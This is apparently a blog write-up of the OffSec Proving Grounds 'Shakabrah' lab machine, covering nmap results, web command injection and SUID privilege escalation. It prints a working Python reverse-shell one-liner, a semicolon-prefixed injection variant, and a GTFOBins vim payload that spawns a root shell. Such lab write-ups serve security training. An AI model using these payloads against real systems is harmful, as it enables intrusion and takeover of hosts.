---
title: "Proving grounds Play: Shakabrah"
layout: post
date: 2023-09-17 01:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- Pg-Play
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds play linux machine writeup"
---

## Nmap

```sh
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 33b96d350bc5c45a86e0261095487782 (RSA)
|   256 a80fa7738302c1978c25bafea5115f74 (ECDSA)
|_  256 fce99ffef9e04d2d76eecadaafc3399e (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web PORT: 80

![img](/assets/images/CTF/Proving_Grounds/Shakabrah/web.png)

The target is vulnerable to RCE.

![img](/assets/images/CTF/Proving_Grounds/Shakabrah/rce.png)

## Obtain Reverse shell

Obtain reverse shell using python3 reverse shell.

```sh
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.226",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```

```sh
;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.226",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```

Final payload to get reverse shell.

## Privilege Escalation

### SUID

```sh
www-data@shakabrah:/home/dylan$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/traceroute6.iputils
/usr/bin/at
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/newgidmap
/usr/bin/vim.basic #exploitable
/usr/bin/newuidmap
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/bin/umount
/bin/fusermount
/bin/ping
/bin/mount
/bin/su
```

### GTFO Bins Exploit

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

This requires that `vim` is compiled with Python support. Prepend :py3 for Python 3.

```sh
./vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
```

```sh
www-data@shakabrah:/var/www/html$ /usr/bin/vim.basic
:
:py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")
```

![img](/assets/images/CTF/Proving_Grounds/Shakabrah/gtfo.png)

**Root Obtained**

![img](/assets/images/CTF/Proving_Grounds/Shakabrah/root.png)

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).